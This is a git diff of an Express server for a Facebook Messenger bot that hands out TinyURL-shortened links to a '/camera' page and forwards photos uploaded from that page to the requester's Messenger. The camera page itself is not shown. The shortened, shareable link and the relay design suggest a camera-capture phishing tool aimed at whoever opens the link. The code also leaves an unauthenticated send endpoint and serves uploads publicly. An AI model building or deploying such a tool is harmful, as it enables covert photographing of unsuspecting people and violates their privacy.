@@ -6,6 +6,7 @@ const fs = require('fs');
 const path = require('path');
 
 const app = express();
+
 const PAGE_ACCESS_TOKEN = process.env.token;
 const VERIFY_TOKEN = 'veme';
 const PORT = 8080;
@@ -15,7 +16,7 @@ app.use(express.urlencoded({ extended: true }));
 app.use('/uploads', express.static('uploads'));
 app.use(express.static('public'));
 
-// === Multer setup ===
+// Multer setup for uploads
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
     const dir = './uploads';
@@ -28,7 +29,7 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage });
 
-// === Serve camera page dynamically ===
+// Serve camera page dynamically with injected PSID
 app.get('/camera', (req, res) => {
   const id = req.query.id || '';
   const filePath = path.join(__dirname, 'public/camera.html');
@@ -39,59 +40,75 @@ app.get('/camera', (req, res) => {
   });
 });
 
-// === Webhook verification ===
+// Webhook verification endpoint
 app.get('/webhook', (req, res) => {
   const mode = req.query['hub.mode'];
   const token = req.query['hub.verify_token'];
   const challenge = req.query['hub.challenge'];
+
   if (mode && token === VERIFY_TOKEN) {
     return res.status(200).send(challenge);
   }
   res.sendStatus(403);
 });
 
-// === Handle incoming messages ===
+// Function to send message to Facebook user
+async function sendMessage(recipientId, messageData) {
+  await axios.post(
+    `https://graph.facebook.com/v19.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`,
+    {
+      recipient: { id: recipientId },
+      message: messageData
+    }
+  );
+}
+
+// Function to shorten URL using TinyURL public API (no API key)
+async function shortenUrl(longUrl) {
+  try {
+    const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
+    return res.data;
+  } catch (err) {
+    console.error('TinyURL error:', err.message);
+    return longUrl; // fallback to original URL
+  }
+}
+
+// Handle incoming messages from Facebook webhook
 app.post('/webhook', async (req, res) => {
   const body = req.body;
+
   if (body.object === 'page') {
     for (const entry of body.entry) {
       for (const event of entry.messaging) {
         const senderId = event.sender.id;
 
-        if (event.message && event.message.text) {
-          const messageText = event.message.text.toLowerCase();
+        // Skip echoes and non-text messages
+        if (!event.message || event.message.is_echo) continue;
 
-          if (messageText === '/generate') {
-            const cameraLink = `${req.protocol}://${req.get('host')}/camera?id=${senderId}`;
-            await sendMessage(senderId, {
-              text: "Tap to open the camera:",
-              quick_replies: [
-                {
-                  content_type: "text",
-                  title: "Open Camera",
-                  payload: "OPEN_CAMERA"
-                }
-              ]
-            });
-            await sendMessage(senderId, { text: cameraLink });
-          } else {
-            // Fallback only for actual user-typed messages
-            await sendMessage(senderId, {
-              text: "I didn't understand that. What would you like to do?",
-              quick_replies: [
-                {
-                  content_type: "text",
-                  title: "/generate",
-                  payload: "GENERATE"
-                },
-                {
-                  content_type: "text",
-                  title: "Help",
-                  payload: "HELP"
-                }
-              ]
-            });
-          }
+        const messageText = event.message.text?.toLowerCase();
+
+        if (messageText === '/generate') {
+          const longUrl = `${req.protocol}://${req.get('host')}/camera?id=${senderId}`;
+          const shortUrl = await shortenUrl(longUrl);
+
+          // Send quick reply with Open Camera
+          await sendMessage(senderId, {
+            text: "[By Somby Ny Aina] Copy this link:"
+          });
+
+          await sendMessage(senderId, { text: shortUrl });
+        } else {
+          await sendMessage(senderId, {
+            text: "Nein. I don't understand.",
+            quick_replies: [
+              {
+                content_type: "text",
+                title: "/generate",
+                payload: "GENERATE"
+              }
+            ]
+          });
         }
       }
     }
@@ -101,14 +118,16 @@ app.post('/webhook', async (req, res) => {
   }
 });
 
-// === /convert endpoint ===
+// /convert endpoint to receive uploaded photo and message from frontend
 app.post('/convert', upload.single('photo'), async (req, res) => {
   const { id, message } = req.body;
+
   if (!req.file) return res.status(400).json({ error: 'No photo uploaded' });
 
   const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
   res.json({ id, message, imageUrl });
 
+  // Auto-send to Messenger if id and message present
   if (id && message) {
     try {
       await axios.post(`${req.protocol}://${req.get('host')}/send`, {
@@ -122,7 +141,7 @@ app.post('/convert', upload.single('photo'), async (req, res) => {
   }
 });
 
-// === /send endpoint ===
+// /send endpoint to send message and optional image to Facebook user
 app.post('/send', async (req, res) => {
   const { id, text, imageUrl } = req.body;
   if (!id || !text) return res.status(400).json({ error: 'Missing id or text' });
@@ -143,17 +162,6 @@ app.post('/send', async (req, res) => {
     res.status(500).json({ error: 'Failed to send message' });
   }
 });
-
-// === Send message to Facebook user ===
-async function sendMessage(recipientId, messageData) {
-  await axios.post(
-    `https://graph.facebook.com/v19.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`,
-    {
-      recipient: { id: recipientId },
-      message: messageData
-    }
-  );
-}
 
 app.listen(PORT, () => {
   console.log(`Server running at http://localhost:${PORT}`);
